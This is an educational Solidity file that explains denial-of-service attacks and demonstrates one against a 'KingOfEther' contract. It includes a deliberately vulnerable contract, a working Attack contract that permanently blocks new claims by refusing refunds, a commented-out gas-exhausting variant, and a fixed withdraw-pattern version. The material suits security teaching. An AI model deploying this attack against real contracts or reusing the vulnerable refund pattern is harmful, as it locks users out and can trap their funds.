/**
 * 
 * A Denial-of-Service (DoS) attack is a type of attack that aims to shut down a machine or network, rendering it unreachable to its intended users. It's possible for DoS attacks to crash the target's system by inundating it with traffic or by feeding it data that causes a crash. In both cases, legitimate users (e.g., workers, members, or account holders) are denied access to the service or resource they expected.

* A common target of DoS attacks are web servers belonging to high-profile businesses, such as financial institutions or media companies. DoS assaults, despite the fact that they do not often result in the theft or loss of major information or other assets, are extremely time- and money-intensive for the victim.

* Flooding or crashing services are two of the most common techniques of DoS attacks. An assault known as "flooding" occurs when a server receives too much traffic, causing it to slow down and eventually stop working altogether.


* Distributed Denial of Service (DDOS) attacks are another sort of DoS attacks. A distributed denial of service (DDoS) assault happens when a large number of systems work together to attack a single target. Instead of being attacked from a single point of entry, the subject is under attack simultaneously from multiple points of entry. A DDoS assault has several advantages for the attacker because of the wide range of hosts that define a DDoS.

●	He is able to take advantage of the higher number of machines to carry out a devastating strike.

●	The random dispersion of attacking systems makes it impossible to pinpoint the attack's exact location. (often worldwide)

●	Shutting down several machines is more difficult than shutting down a single one since the real attackers are hidden behind numerous (usually compromised) systems.

 * here are many ways to attack a smart contract to make it unusable.

One exploit we introduce here is denial of service by making the function to send Ether fail.
 */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

//One way to prevent this is to allow the users to withdraw their Ether instead of sending it.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract KingOfEther {
    address public king;
    uint256 public balance;
    mapping(address => uint256) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
